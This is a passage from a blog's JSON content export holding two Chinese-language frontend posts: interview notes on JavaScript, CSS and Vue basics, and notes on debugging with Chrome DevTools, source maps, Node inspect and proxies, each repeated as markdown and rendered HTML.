6种，undefined，null，boolean，string，number，symbol；\n2.let和var的区别\tlet：有作用域，不会出现变量提升，不与全局环境挂钩；\n3.this是什么？\tthis是一种指向，在运行的时候，会指向最后调用它的对象；\n4.怎么判断一个变量是什么数据类型？\t\t\ntypeof，缺点:只能判断基础数据类型，对于检测对象以及数组乏力； instanceof：为了解决前面的问题，它可以判断一个对象是不是数组； object。prototype。toString。call（检测对象）；\n5.ajax\t局部更新不刷新整个页面；\n6.promise基本了解\t\t\t为了解决ajax回调地域的问题，下一个请求依赖上一个请求返回的数据，会造成这；promise支持链式调用，所以能解决这个问题；\n7.async/await\t\t\t将异步的代码写出同步的风格，就是一个语法糖；promise+generator的语法糖；\n8.dom操作有哪些？\t\t\t\n\n\n\n## 二、CSS\n\n1.居中，块级和行内      \n行内：text-align：center；  \n块级：首先定义宽度，margin：0，auto；  \n其他方法：父元素display设为flex。加上一句话:justify-content；center；\n2.垂直居中  \n父元素display设为flex。加上一句话:justify-content；center；align-items：center；\n3.float布局以及缺点，文档流；   \n缺点：最开始用来解决文本围绕图片问题，但是有一个缺点，会造成父元素高度塌陷，因为脱离了文档流；\n4.position的属性有哪些？    \nabosulte:绝对定位  子元素位置根据父元素决定           \nfixed:固定定位     跟据浏览器决定 ， \nrelative：相对定位 根据应该出现的位置定位；\n5.flex布局          是一个弹性的伸缩盒子模型\n\n## 三、vue\n\n1.组件通信\n2.为什么子组件的数据需要用函数形式，根组件不用；\n3.computed/watch的用法和区别；\n4.router了解","slug":"前端","published":1,"updated":"2021-07-22T05:40:22.000Z","_id":"clg29vyht004vao9c73gn5ss9","comments":1,"layout":"post","photos":[],"link":"","content":"<h1 id=\"前端面试问题\"><a href=\"#前端面试问题\" class=\"headerlink\" title=\"##前端面试问题\"></a>##前端面试问题</h1><h2 id=\"一、JS\"><a href=\"#一、JS\" class=\"headerlink\" title=\"一、JS\"></a>一、JS</h2><p>1.JS中的基础数据类型：  6种，undefined，null，boolean，string，number，symbol；<br>2.let和var的区别    let：有作用域，不会出现变量提升，不与全局环境挂钩；<br>3.this是什么？    this是一种指向，在运行的时候，会指向最后调用它的对象；<br>4.怎么判断一个变量是什么数据类型？<br>typeof，缺点:只能判断基础数据类型，对于检测对象以及数组乏力； instanceof：为了解决前面的问题，它可以判断一个对象是不是数组； object。prototype。toString。call（检测对象）；<br>5.ajax    局部更新不刷新整个页面；<br>6.promise基本了解            为了解决ajax回调地域的问题，下一个请求依赖上一个请求返回的数据，会造成这；promise支持链式调用，所以能解决这个问题；<br>7.async/await            将异步的代码写出同步的风格，就是一个语法糖；promise+generator的语法糖；<br>8.dom操作有哪些？            </p>\n<h2 id=\"二、CSS\"><a href=\"#二、CSS\" class=\"headerlink\" title=\"二、CSS\"></a>二、CSS</h2><p>1.居中，块级和行内<br>行内：text-align：center；<br>块级：首先定义宽度，margin：0，auto；<br>其他方法：父元素display设为flex。加上一句话:justify-content；center；<br>2.垂直居中<br>父元素display设为flex。加上一句话:justify-content；center；align-items：center；<br>3.float布局以及缺点，文档流；<br>缺点：最开始用来解决文本围绕图片问题，但是有一个缺点，会造成父元素高度塌陷，因为脱离了文档流；<br>4.position的属性有哪些？<br>abosulte:绝对定位  子元素位置根据父元素决定<br>fixed:固定定位     跟据浏览器决定 ，<br>relative：相对定位 根据应该出现的位置定位；<br>5.flex布局          是一个弹性的伸缩盒子模型</p>\n<h2 id=\"三、vue\"><a href=\"#三、vue\" class=\"headerlink\" title=\"三、vue\"></a>三、vue</h2><p>1.组件通信<br>2.为什么子组件的数据需要用函数形式，根组件不用；<br>3.computed/watch的用法和区别；<br>4.router了解</p>\n","site":{"data":{}},"excerpt":"","more":"<h1 id=\"前端面试问题\"><a href=\"#前端面试问题\" class=\"headerlink\" title=\"##前端面试问题\"></a>##前端面试问题</h1><h2 id=\"一、JS\"><a href=\"#一、JS\" class=\"headerlink\" title=\"一、JS\"></a>一、JS</h2><p>1.JS中的基础数据类型：  6种，undefined，null，boolean，string，number，symbol；<br>2.let和var的区别    let：有作用域，不会出现变量提升，不与全局环境挂钩；<br>3.this是什么？    this是一种指向，在运行的时候，会指向最后调用它的对象；<br>4.怎么判断一个变量是什么数据类型？<br>typeof，缺点:只能判断基础数据类型，对于检测对象以及数组乏力； instanceof：为了解决前面的问题，它可以判断一个对象是不是数组； object。prototype。toString。call（检测对象）；<br>5.ajax    局部更新不刷新整个页面；<br>6.promise基本了解            为了解决ajax回调地域的问题，下一个请求依赖上一个请求返回的数据，会造成这；promise支持链式调用，所以能解决这个问题；<br>7.async/await            将异步的代码写出同步的风格，就是一个语法糖；promise+generator的语法糖；<br>8.dom操作有哪些？            </p>\n<h2 id=\"二、CSS\"><a href=\"#二、CSS\" class=\"headerlink\" title=\"二、CSS\"></a>二、CSS</h2><p>1.居中，块级和行内<br>行内：text-align：center；<br>块级：首先定义宽度，margin：0，auto；<br>其他方法：父元素display设为flex。加上一句话:justify-content；center；<br>2.垂直居中<br>父元素display设为flex。加上一句话:justify-content；center；align-items：center；<br>3.float布局以及缺点，文档流；<br>缺点：最开始用来解决文本围绕图片问题，但是有一个缺点，会造成父元素高度塌陷，因为脱离了文档流；<br>4.position的属性有哪些？<br>abosulte:绝对定位  子元素位置根据父元素决定<br>fixed:固定定位     跟据浏览器决定 ，<br>relative：相对定位 根据应该出现的位置定位；<br>5.flex布局          是一个弹性的伸缩盒子模型</p>\n<h2 id=\"三、vue\"><a href=\"#三、vue\" class=\"headerlink\" title=\"三、vue\"></a>三、vue</h2><p>1.组件通信<br>2.为什么子组件的数据需要用函数形式，根组件不用；<br>3.computed/watch的用法和区别；<br>4.router了解</p>\n"},{"title":"前端开发调试","date":"2023-03-27T10:51:45.000Z","mp3":null,"cover":"img/bg14.jpg","_content":"\n\n\n# 前端开发调试\n\n> No code，no bug\n\n## 一、Bug 与 Debug\n\n### 1.前端Debug的特点\n\n- 多平台（浏览器、NodeJS、）\n- 多环境（本地开发环境，线上环境）\n- 多工具（Chrome Devtools、Charles、）\n- 多技巧（Console、Breakpoint、sourceMap、代理等）\n\n## 二、桌面端Debug\n\n### 1. Chrome Dev Tools\n\n- 动态修改样式\n- Console\n\n```js\nconsole.log(\"\")\nconsole.warn(\"\");\nconsole.error(\"\");\nconsole.debug(\"\");\nconsole.infor(\"\");\n\nconsole.table(\"\")\t\t//具象化展示JSON和数组数据\nconsole.dir(\"\")\t\t\t//通过类似文件树的方式展示对象的属性\nconsole.log(\"%s,%o,%c,%d\") //占位符：s字符串 o对象 c样式 d数字\n\nconsole.log(\"123\");\t\t\nconsole.log(123);\t\t//两者输出颜色不同\n```\n\n- source Map\n\n利用console添加debugger来找出问题在哪里\n\n### 2.压缩后的代码如何调试？\n\n> 前端代码天生具有开源属性，出于安全考虑，上线之前JS代码通常会被压缩，压缩之后的代码只有一行，变量使用a\\b等替换，整体变得不可读；\n\n##### 代码压缩工具\n\n- webpack\n- Uglify JS\n- terser\n\n##### 线上代码调试\n\n- 使用source map插件进行映射；\n\n- mappings字段存储了源文件和source map的映射\n- 英文：表示源码及压缩代码的位置关联；\n- 逗号：分割一行代码中的内容；\n- 分号：代表换行；\n\n##### 问题\n\n既然source map 可以映射源码，那压缩后的代码带上source map上线不就又不安全了吗？\n\n答：source map应用场景通常是监控，代码上线的时候是不上source map的，同时也能减少体积；\n\n项目打包的时候，带上source map一起build，上线之前把source map上传到监控平台，然后删除map的产物，再上传到服务器；然后监控平台如果收集到线上环境的错误，就进行分析，拿错误对照监控平台的map产物，定位错误；\n\n### 3. Network\n\n- 查看不同网络下页面加载的情况\n- 文件请求\n- 网络请求时间，异步同步\n\n### 4. Application\n\n> 存储相关的内容\n\n- 清理缓存\n- 查看cookies\n- 查看会话token等；\n\n### 5. Performance\n\n```\n页面卡顿->查看FPS指标->寻找性能瓶颈->优化代码\n```\n\n- 可以查看代码行运行耗费的时间，找到性能瓶颈；\n\n##### 核心web指标\n\n- LCP（Largest Contentful Paint）：最大内容绘制，测量加载性能；为了提供良好的用户体验，LCP应在页面首次开始加载的2.5s内发生；\n- FID（First input Delay）：首次输入延迟，测量交互性；为了用户体验，页面的FID应为100ms甚至更短；\n- CLS（Cumulative layout Shift）:累计布局偏移，测量视觉稳定性。应当保持在0.1以下；\n\n## 三、移动端Debug\n\n### 1.调试方法\n\n- 真机调试；\n\n![](https://s3.bmp.ovh/imgs/2023/02/05/cd81bc4c19058ed3.jpg)\n\n- VConsole\n\n![](https://s3.bmp.ovh/imgs/2023/02/05/c349839e8323843c.jpg)\n\n- 代理工具（Charles推荐但收费、Progress）\n\n- NodeJS调试\n\n```shell\n//step1\nnode --inspect=8888 index.js\n\n//step2\n//chrome浏览器访问\n```\n\n- 使用vscode进行调试\n\n```\n启动调试->打开网址->添加断点\n```\n\n## 四、前端常用调试方法\n\n### 1.线上即时修改 Overrides\n\n- 打开Sources面板下的Overrides\n- 点击Select folders for overrides,选择本地空文件夹\n- 允许授权\n- 在page种修改代码，然后保存\n- 打开devTools,点击右上角的三个小点->more tools->changes就能看到所有的修改了\n\n### 2.利用代理解决开发阶段的跨域问题\n\n![](https://s3.bmp.ovh/imgs/2023/02/05/a8bc42e162606f74.jpg)\n\n##### 问题\n\n为什么使用代理可以解决跨域问题？\n\n```\n\n```\n\n- 配置到线上的使用nginx解决跨域问题；\n\n### 3.使用代理工具Mock数据\n\n![](https://s3.bmp.ovh/imgs/2023/02/05/6174410f7146a1dc.jpg)\n\n### 4.小黄鸭调试大法\n\n![](https://s3.bmp.ovh/imgs/2023/02/05/55b236ba9e0415bc.jpg)\n\n\n\n\n\n\n\n","source":"_posts/前端开发调试.md","raw":"---\ntitle: 前端开发调试\ndate: 2023-03-27 18:51:45\ncategories: \n    - 前端\ntags: \n    - 面试笔记\n    - 笔记\nmp3: \ncover: img/bg14.jpg\n---\n\n\n\n# 前端开发调试\n\n> No code，no bug\n\n## 一、Bug 与 Debug\n\n### 1.前端Debug的特点\n\n- 多平台（浏览器、NodeJS、）\n- 多环境（本地开发环境，线上环境）\n- 多工具（Chrome Devtools、Charles、）\n- 多技巧（Console、Breakpoint、sourceMap、代理等）\n\n## 二、桌面端Debug\n\n### 1. Chrome Dev Tools\n\n- 动态修改样式\n- Console\n\n```js\nconsole.log(\"\")\nconsole.warn(\"\");\nconsole.error(\"\");\nconsole.debug(\"\");\nconsole.infor(\"\");\n\nconsole.table(\"\")\t\t//具象化展示JSON和数组数据\nconsole.dir(\"\")\t\t\t//通过类似文件树的方式展示对象的属性\nconsole.log(\"%s,%o,%c,%d\") //占位符：s字符串 o对象 c样式 d数字\n\nconsole.log(\"123\");\t\t\nconsole.log(123);\t\t//两者输出颜色不同\n```\n\n- source Map\n\n利用console添加debugger来找出问题在哪里\n\n### 2.压缩后的代码如何调试？\n\n> 前端代码天生具有开源属性，出于安全考虑，上线之前JS代码通常会被压缩，压缩之后的代码只有一行，变量使用a\\b等替换，整体变得不可读；\n\n##### 代码压缩工具\n\n- webpack\n- Uglify JS\n- terser\n\n##### 线上代码调试\n\n- 使用source map插件进行映射；\n\n- mappings字段存储了源文件和source map的映射\n- 英文：表示源码及压缩代码的位置关联；\n- 逗号：分割一行代码中的内容；\n- 分号：代表换行；\n\n##### 问题\n\n既然source map 可以映射源码，那压缩后的代码带上source map上线不就又不安全了吗？\n\n答：source map应用场景通常是监控，代码上线的时候是不上source map的，同时也能减少体积；\n\n项目打包的时候，带上source map一起build，上线之前把source map上传到监控平台，然后删除map的产物，再上传到服务器；然后监控平台如果收集到线上环境的错误，就进行分析，拿错误对照监控平台的map产物，定位错误；\n\n### 3. Network\n\n- 查看不同网络下页面加载的情况\n- 文件请求\n- 网络请求时间，异步同步\n\n### 4. Application\n\n> 存储相关的内容\n\n- 清理缓存\n- 查看cookies\n- 查看会话token等；\n\n### 5. Performance\n\n```\n页面卡顿->查看FPS指标->寻找性能瓶颈->优化代码\n```\n\n- 可以查看代码行运行耗费的时间，找到性能瓶颈；\n\n##### 核心web指标\n\n- LCP（Largest Contentful Paint）：最大内容绘制，测量加载性能；为了提供良好的用户体验，LCP应在页面首次开始加载的2.5s内发生；\n- FID（First input Delay）：首次输入延迟，测量交互性；为了用户体验，页面的FID应为100ms甚至更短；\n- CLS（Cumulative layout Shift）:累计布局偏移，测量视觉稳定性。应当保持在0.1以下；\n\n## 三、移动端Debug\n\n### 1.调试方法\n\n- 真机调试；\n\n![](https://s3.bmp.ovh/imgs/2023/02/05/cd81bc4c19058ed3.jpg)\n\n- VConsole\n\n![](https://s3.bmp.ovh/imgs/2023/02/05/c349839e8323843c.jpg)\n\n- 代理工具（Charles推荐但收费、Progress）\n\n- NodeJS调试\n\n```shell\n//step1\nnode --inspect=8888 index.js\n\n//step2\n//chrome浏览器访问\n```\n\n- 使用vscode进行调试\n\n```\n启动调试->打开网址->添加断点\n```\n\n## 四、前端常用调试方法\n\n### 1.线上即时修改 Overrides\n\n- 打开Sources面板下的Overrides\n- 点击Select folders for overrides,选择本地空文件夹\n- 允许授权\n- 在page种修改代码，然后保存\n- 打开devTools,点击右上角的三个小点->more tools->changes就能看到所有的修改了\n\n### 2.利用代理解决开发阶段的跨域问题\n\n![](https://s3.bmp.ovh/imgs/2023/02/05/a8bc42e162606f74.jpg)\n\n##### 问题\n\n为什么使用代理可以解决跨域问题？\n\n```\n\n```\n\n- 配置到线上的使用nginx解决跨域问题；\n\n### 3.使用代理工具Mock数据\n\n![](https://s3.bmp.ovh/imgs/2023/02/05/6174410f7146a1dc.jpg)\n\n### 4.小黄鸭调试大法\n\n![](https://s3.bmp.ovh/imgs/2023/02/05/55b236ba9e0415bc.jpg)\n\n\n\n\n\n\n\n","slug":"前端开发调试","published":1,"updated":"2023-03-27T11:06:48.816Z","_id":"clg29vyhu004zao9c4pyue59b","comments":1,"layout":"post","photos":[],"link":"","content":"<h1 id=\"前端开发调试\"><a href=\"#前端开发调试\" class=\"headerlink\" title=\"前端开发调试\"></a>前端开发调试</h1><blockquote>\n<p>No code，no bug</p>\n</blockquote>\n<h2 id=\"一、Bug-与-Debug\"><a href=\"#一、Bug-与-Debug\" class=\"headerlink\" title=\"一、Bug 与 Debug\"></a>一、Bug 与 Debug</h2><h3 id=\"1-前端Debug的特点\"><a href=\"#1-前端Debug的特点\" class=\"headerlink\" title=\"1.前端Debug的特点\"></a>1.前端Debug的特点</h3><ul>\n<li>多平台（浏览器、NodeJS、）</li>\n<li>多环境（本地开发环境，线上环境）</li>\n<li>多工具（Chrome Devtools、Charles、）</li>\n<li>多技巧（Console、Breakpoint、sourceMap、代理等）</li>\n</ul>\n<h2 id=\"二、桌面端Debug\"><a href=\"#二、桌面端Debug\" class=\"headerlink\" title=\"二、桌面端Debug\"></a>二、桌面端Debug</h2><h3 id=\"1-Chrome-Dev-Tools\"><a href=\"#1-Chrome-Dev-Tools\" class=\"headerlink\" title=\"1. Chrome Dev Tools\"></a>1. Chrome Dev Tools</h3><ul>\n<li>动态修改样式</li>\n<li>Console</li>\n</ul>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs js\"><span class=\"hljs-variable language_\">console</span>.<span class=\"hljs-title function_\">log</span>(<span class=\"hljs-string\">&quot;&quot;</span>)<br><span class=\"hljs-variable language_\">console</span>.<span class=\"hljs-title function_\">warn</span>(<span class=\"hljs-string\">&quot;&quot;</span>);<br><span class=\"hljs-variable language_\">console</span>.<span class=\"hljs-title function_\">error</span>(<span class=\"hljs-string\">&quot;&quot;</span>);<br><span class=\"hljs-variable language_\">console</span>.<span class=\"hljs-title function_\">debug</span>(<span class=\"hljs-string\">&quot;&quot;</span>);<br><span class=\"hljs-variable language_\">console</span>.<span class=\"hljs-title function_\">infor</span>(<span class=\"hljs-string\">&quot;&quot;</span>);<br><br><span class=\"hljs-variable language_\">console</span>.<span class=\"hljs-title function_\">table</span>(<span class=\"hljs-string\">&quot;&quot;</span>)\t\t<span class=\"hljs-comment\">//具象化展示JSON和数组数据</span><br><span class=\"hljs-variable language_\">console</span>.<span class=\"hljs-title function_\">dir</span>(<span class=\"hljs-string\">&quot;&quot;</span>)\t\t\t<span class=\"hljs-comment\">//通过类似文件树的方式展示对象的属性</span><br><span class=\"hljs-variable language_\">console</span>.<span class=\"hljs-title function_\">log</span>(<span class=\"hljs-string\">&quot;%s,%o,%c,%d&quot;</span>) <span class=\"hljs-comment\">//占位符：s字符串 o对象 c样式 d数字</span><br><br><span class=\"hljs-variable language_\">console</span>.<span class=\"hljs-title function_\">log</span>(<span class=\"hljs-string\">&quot;123&quot;</span>);\t\t<br><span class=\"hljs-variable language_\">console</span>.<span class=\"hljs-title function_\">log</span>(<span class=\"hljs-number\">123</span>);\t\t<span class=\"hljs-comment\">//两者输出颜色不同</span><br></code></pre></td></tr></table></figure>\n\n<ul>\n<li>source Map</li>\n</ul>\n<p>利用console添加debugger来找出问题在哪里</p>\n<h3 id=\"2-压缩后的代码如何调试？\"><a href=\"#2-压缩后的代码如何调试？\" class=\"headerlink\" title=\"2.压缩后的代码如何调试？\"></a>2.压缩后的代码如何调试？</h3><blockquote>\n<p>前端代码天生具有开源属性，出于安全考虑，上线之前JS代码通常会被压缩，压缩之后的代码只有一行，变量使用a\\b等替换，整体变得不可读；</p>\n</blockquote>\n<h5 id=\"代码压缩工具\"><a href=\"#代码压缩工具\" class=\"headerlink\" title=\"代码压缩工具\"></a>代码压缩工具</h5><ul>\n<li>webpack</li>\n<li>Uglify JS</li>\n<li>terser</li>\n</ul>\n<h5 id=\"线上代码调试\"><a href=\"#线上代码调试\" class=\"headerlink\" title=\"线上代码调试\"></a>线上代码调试</h5><ul>\n<li><p>使用source map插件进行映射；</p>\n</li>\n<li><p>mappings字段存储了源文件和source map的映射</p>\n</li>\n<li><p>英文：表示源码及压缩代码的位置关联；</p>\n</li>\n<li><p>逗号：分割一行代码中的内容；</p>\n</li>\n<li><p>分号：代表换行；</p>\n</li>\n</ul>\n<h5 id=\"问题\"><a href=\"#问题\" class=\"headerlink\" title=\"问题\"></a>问题</h5><p>既然source map 可以映射源码，那压缩后的代码带上source map上线不就又不安全了吗？</p>\n<p>答：source map应用场景通常是监控，代码上线的时候是不上source map的，同时也能减少体积；</p>\n<p>项目打包的时候，带上source map一起build，上线之前把source map上传到监控平台，然后删除map的产物，再上传到服务器；然后监控平台如果收集到线上环境的错误，就进行分析，拿错误对照监控平台的map产物，定位错误；</p>\n<h3 id=\"3-Network\"><a href=\"#3-Network\" class=\"headerlink\" title=\"3. Network\"></a>3. Network</h3><ul>\n<li>查看不同网络下页面加载的情况</li>\n<li>文件请求</li>\n<li>网络请求时间，异步同步</li>\n</ul>\n<h3 id=\"4-Application\"><a href=\"#4-Application\" class=\"headerlink\" title=\"4. Application\"></a>4. Application</h3><blockquote>\n<p>存储相关的内容</p>\n</blockquote>\n<ul>\n<li>清理缓存</li>\n<li>查看cookies</li>\n<li>查看会话token等；</li>\n</ul>\n<h3 id=\"5-Performance\"><a href=\"#5-Performance\" class=\"headerlink\" title=\"5. Performance\"></a>5. Performance</h3><figure class=\"highlight clean\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs clean\">页面卡顿-&gt;查看FPS指标-&gt;寻找性能瓶颈-&gt;优化代码<br></code></pre></td></tr></table></figure>\n\n<ul>\n<li>可以查看代码行运行耗费的时间，找到性能瓶颈；</li>\n</ul>\n<h5 id=\"核心web指标\"><a href=\"#核心web指标\" class=\"headerlink\" title=\"核心web指标\"></a>核心web指标</h5><ul>\n<li>LCP（Largest Contentful Paint）：最大内容绘制，测量加载性能；为了提供良好的用户体验，LCP应在页面首次开始加载的2.5s内发生；</li>\n<li>FID（First input Delay）：首次输入延迟，测量交互性；为了用户体验，页面的FID应为100ms甚至更短；</li>\n<li>CLS（Cumulative layout Shift）:累计布局偏移，测量视觉稳定性。应当保持在0.1以下；</li>\n</ul>\n<h2 id=\"三、移动端Debug\"><a href=\"#三、移动端Debug\" class=\"headerlink\" title=\"三、移动端Debug\"></a>三、移动端Debug</h2><h3 id=\"1-调试方法\"><a href=\"#1-调试方法\" class=\"headerlink\" title=\"1.调试方法\"></a>1.调试方法</h3><ul>\n<li>真机调试；</li>\n</ul>\n<p><img src=\"https://s3.bmp.ovh/imgs/2023/02/05/cd81bc4c19058ed3.jpg\"></p>\n<ul>\n<li>VConsole</li>\n</ul>\n<p><img src=\"https://s3.bmp.ovh/imgs/2023/02/05/c349839e8323843c.jpg\"></p>\n<ul>\n<li><p>代理工具（Charles推荐但收费、Progress）</p>\n</li>\n<li><p>NodeJS调试</p>\n</li>\n</ul>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs shell\">//step1<br>node --inspect=8888 index.js<br><br>//step2<br>//chrome浏览器访问<br></code></pre></td></tr></table></figure>\n\n<ul>\n<li>使用vscode进行调试</li>\n</ul>\n<figure class=\"highlight clean\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs clean\">启动调试-&gt;打开网址-&gt;添加断点<br></code></pre></td></tr></table></figure>\n\n<h2 id=\"四、前端常用调试方法\"><a href=\"#四、前端常用调试方法\" class=\"headerlink\" title=\"四、前端常用调试方法\"></a>四、前端常用调试方法</h2><h3 id=\"1-线上即时修改-Overrides\"><a href=\"#1-线上即时修改-Overrides\" class=\"headerlink\" title=\"1.线上即时修改 Overrides\"></a>1.线上即时修改 Overrides</h3><ul>\n<li>打开Sources面板下的Overrides</li>\n<li>点击Select folders for overrides,选择本地空文件夹</li>\n<li>允许授权</li>\n<li>在page种修改代码，然后保存</li>\n<li>打开devTools,点击右上角的三个小点-&gt;more tools-&gt;changes就能看到所有的修改了</li>\n</ul>\n<h3 id=\"2-利用代理解决开发阶段的跨域问题\"><a href=\"#2-利用代理解决开发阶段的跨域问题\" class=\"headerlink\" title=\"2.利用代理解决开发阶段的跨域问题\"></a>2.利用代理解决开发阶段的跨域问题</h3><p><img src=\"https://s3.bmp.ovh/imgs/2023/02/05/a8bc42e162606f74.jpg\"></p>\n<h5 id=\"问题-1\"><a href=\"#问题-1\" class=\"headerlink\" title=\"问题\"></a>问题</h5><p>为什么使用代理可以解决跨域问题？</p>\n<figure class=\"highlight\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs\"><br></code></pre></td></tr></table></figure>\n\n<ul>\n<li>配置到线上的使用nginx解决跨域问题；</li>\n</ul>\n<h3 id=\"3-使用代理工具Mock数据\"><a href=\"#3-使用代理工具Mock数据\" class=\"headerlink\" title=\"3.使用代理工具Mock数据\"></a>3.使用代理工具Mock数据</h3><p><img src=\"https://s3.bmp.ovh/imgs/2023/02/05/6174410f7146a1dc.jpg\"></p>\n<h3 id=\"4-小黄鸭调试大法\"><a href=\"#4-小黄鸭调试大法\" class=\"headerlink\" title=\"4.小黄鸭调试大法\"></a>4.小黄鸭调试大法</h3><p><img src=\"https://s3.bmp.ovh/imgs/2023/02/05/55b236ba9e0415bc.jpg\"></p>\n","site":{"data":{}},"excerpt":"","more":"<h1 id=\"前端开发调试\"><a href=\"#前端开发调试\" class=\"headerlink\" title=\"前端开发调试\"></a>前端开发调试</h1><blockquote>\n<p>No code，no bug</p>\n</blockquote>\n<h2 id=\"一、Bug-与-Debug\"><a href=\"#一、Bug-与-Debug\" class=\"headerlink\" title=\"一、Bug 与 Debug\"></a>一、Bug 与 Debug</h2><h3 id=\"1-前端Debug的特点\"><a href=\"#1-前端Debug的特点\" class=\"headerlink\" title=\"1.前端Debug的特点\"></a>1.前端Debug的特点</h3><ul>\n<li>多平台（浏览器、NodeJS、）</li>\n<li>多环境（本地开发环境，线上环境）</li>\n<li>多工具（Chrome Devtools、Charles、）</li>\n<li>多技巧（Console、Breakpoint、sourceMap、代理等）</li>\n</ul>\n<h2 id=\"二、桌面端Debug\"><a href=\"#二、桌面端Debug\" class=\"headerlink\" title=\"二、桌面端Debug\"></a>二、桌面端Debug</h2><h3 id=\"1-Chrome-Dev-Tools\"><a href=\"#1-Chrome-Dev-Tools\" class=\"headerlink\" title=\"1. Chrome Dev Tools\"></a>1. Chrome Dev Tools</h3><ul>\n<li>动态修改样式</li>\n<li>Console</li>\n</ul>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs js\"><span class=\"hljs-variable language_\">console</span>.<span class=\"hljs-title function_\">log</span>(<span class=\"hljs-string\">&quot;&quot;</span>)<br><span class=\"hljs-variable language_\">console</span>.<span class=\"hljs-title function_\">warn</span>(<span class=\"hljs-string\">&quot;&quot;</span>);<br><span class=\"hljs-variable language_\">console</span>.<span class=\"hljs-title function_\">error</span>(<span class=\"hljs-string\">&quot;&quot;</span>);<br><span class=\"hljs-variable language_\">console</span>.<span class=\"hljs-title function_\">debug</span>(<span class=\"hljs-string\">&quot;&quot;</span>);<br><span class=\"hljs-variable language_\">console</span>.<span class=\"hljs-title function_\">infor</span>(<span class=\"hljs-string\">&quot;&quot;</span>);<br><br><span class=\"hljs-variable language_\">console</span>.<span class=\"hljs-title function_\">table</span>(<span class=\"hljs-string\">&quot;&quot;</span>)\t\t<span class=\"hljs-comment\">//具象化展示JSON和数组数据</span><br><span class=\"hljs-variable language_\">console</span>.<span class=\"hljs-title function_\">dir</span>(<span class=\"hljs-string\">&quot;&quot;</span>)\t\t\t<span class=\"hljs-comment\">//通过类似文件树的方式展示对象的属性</span><br><span class=\"hljs-variable language_\">console</span>.<span class=\"hljs-title function_\">log</span>(<span class=\"hljs-string\">&quot;%s,%o,%c,%d&quot;</span>) <span class=\"hljs-comment\">//占位符：s字符串 o对象 c样式 d数字</span><br><br><span class=\"hljs-variable language_\">console</span>.<span class=\"hljs-title function_\">log</span>(<span class=\"hljs-string\">&quot;123&quot;</span>);\t\t<br><span class=\"hljs-variable language_\">console</span>.<span class=\"hljs-title function_\">log</span>(<span class=\"hljs-number\">123</span>);\t\t<span class=\"hljs-comment\">//两者输出颜色不同</span><br></code></pre></td></tr></table></figure>\n\n<ul>\n<li>source Map</li>\n</ul>\n<p>利用console添加debugger来找出问题在哪里</p>\n<h3 id=\"2-压缩后的代码如何调试？\"><a href=\"#2-压缩后的代码如何调试？\" class=\"headerlink\" title=\"2.压缩后的代码如何调试？\"></a>2.压缩后的代码如何调试？</h3><blockquote>\n<p>前端代码天生具有开源属性，出于安全考虑，上线之前JS代码通常会被压缩，压缩之后的代码只有一行，变量使用a\\b等替换，整体变得不可读；</p>\n</blockquote>\n<h5 id=\"代码压缩工具\"><a href=\"#代码压缩工具\" class=\"headerlink\" title=\"代码压缩工具\"></a>代码压缩工具</h5><ul>\n<li>webpack</li>\n<li>Uglify JS</li>\n<li>terser</li>\n</ul>\n<h5 id=\"线上代码调试\"><a href=\"#线上代码调试\" class=\"headerlink\" title=\"线上代码调试\"></a>线上代码调试</h5><ul>\n<li><p>使用source map插件进行映射；</p>\n</li>\n<li><p>mappings字段存储了源文件和source map的映射</p>\n</li>\n<li><p>英文：表示源码及压缩代码的位置关联；</p>\n</li>\n<li><p>逗号：分割一行代码中的内容；</p>\n</li>\n<li><p>分号：代表换行；</p>\n</li>\n</ul>\n<h5 id=\"问题\"><a href=\"#问题\" class=\"headerlink\" title=\"问题\"></a>问题</h5><p>既然source map 可以映射源码，那压缩后的代码带上source map上线不就又不安全了吗？</p>\n<p>答：source map应用场景通常是监控，代码上线的时候是不上source map的，同时也能减少体积；</p>\n<p>项目打包的时候，带上source map一起build，上线之前把source map上传到监控平台，然后删除map的产物，再上传到服务器；然后监控平台如果收集到线上环境的错误，就进行分析，拿错误对照监控平台的map产物，定位错误；</p>\n<h3 id=\"3-Network\"><a href=\"#3-Network\" class=\"headerlink\" title=\"3. Network\"></a>3. Network</h3><ul>\n<li>查看不同网络下页面加载的情况</li>\n<li>文件请求</li>\n<li>网络请求时间，异步同步</li>\n</ul>\n<h3 id=\"4-Application\"><a href=\"#4-Application\" class=\"headerlink\" title=\"4. Application\"></a>4. Application</h3><blockquote>\n<p>存储相关的内容</p>\n</blockquote>\n<ul>\n<li>清理缓存</li>\n<li>查看cookies</li>\n<li>查看会话token等；</li>\n</ul>\n<h3 id=\"5-Performance\"><a href=\"#5-Performance\" class=\"headerlink\" title=\"5. Performance\"></a>5. Performance</h3><figure class=\"highlight clean\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs clean\">页面卡顿-&gt;查看FPS指标-&gt;寻找性能瓶颈-&gt;优化代码<br></code></pre></td></tr></table></figure>\n\n<ul>\n<li>可以查看代码行运行耗费的时间，找到性能瓶颈；</li>\n</ul>\n<h5 id=\"核心web指标\"><a href=\"#核心web指标\" class=\"headerlink\" 